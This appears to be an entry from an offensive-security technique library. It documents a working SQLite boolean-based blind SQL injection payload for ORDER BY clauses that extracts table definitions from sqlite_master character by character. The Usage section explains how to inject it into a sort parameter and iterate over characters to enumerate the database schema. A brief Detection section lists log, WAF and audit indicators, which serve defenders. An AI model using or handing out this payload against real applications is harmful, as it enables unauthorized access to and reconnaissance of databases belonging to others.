---
id: 1b4e7d99-906c-4163-af6a-0d09bb4ebbba
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:37.093285+00:00'
updated_at: '2023-04-10T20:24:28.480455+00:00'
tags:
  - sqli
  - boolean-based
  - order-by
  - sqlite
platforms:
  - Web
  - SQLite
validated: true
---

# SQLite-Order-By-Boolean-Injection-Snippet

## Code

```sql
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## Description

This SQL snippet implements a boolean-based injection payload for the ORDER BY clause in SQLite databases. It uses a CASE WHEN statement to evaluate whether the first character of the CREATE SQL for the first non-system table matches a specified character ('some_char'). If true, it sorts by <order_element_1> (e.g., a column number); if false, by <order_element_2>. This allows attackers to infer database structure character-by-character by observing changes in the sorted output of the application's response.

The payload targets the sqlite_master system table to extract table creation statements, filtering out internal tables like sqlite_sequence. It's designed for blind injection scenarios where direct data return is not possible, relying instead on sorting artifacts as the oracle.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| some_char | The single character to test against the extracted data (e.g., for ASCII comparison) | 'u' |
| <order_element_1> | The sort element used when the condition is true (e.g., column number for ascending sort) | 1 |
| <order_element_2> | The sort element used when the condition is false (e.g., column number for descending sort) | 2 |

## Usage

Inject this snippet into a vulnerable ORDER BY parameter in a web application query, such as `?sort=id, [payload] ASC`. Iterate by changing 'some_char' and the substr position (e.g., substr(sql,2,1) for the second character) to extract full strings like table names. Use in conjunction with a proxy to modify requests and observe response differences. This is typically part of a larger SQLi procedure for database enumeration during initial access or reconnaissance.

Related procedures: [[procedures/SQLite-Boolean-Based-Order-By-Injection]]

## Detection

- Monitor application logs for anomalous ORDER BY clauses containing CASE WHEN, SUBSTR, or HEX functions.
- WAF rules detecting SQL keywords like 'CASE WHEN' or accesses to 'sqlite_master' in user inputs.
- Database audit logs showing repeated queries to system tables with LIMIT 1 OFFSET 0 patterns.
- Behavioral anomalies: Frequent sort order changes in responses without corresponding user input variations.

## Related

- [[procedures/SQLite-Boolean-Based-Order-By-Injection]]
- [[techniques/Exploit Public-Facing Application|T1190]]
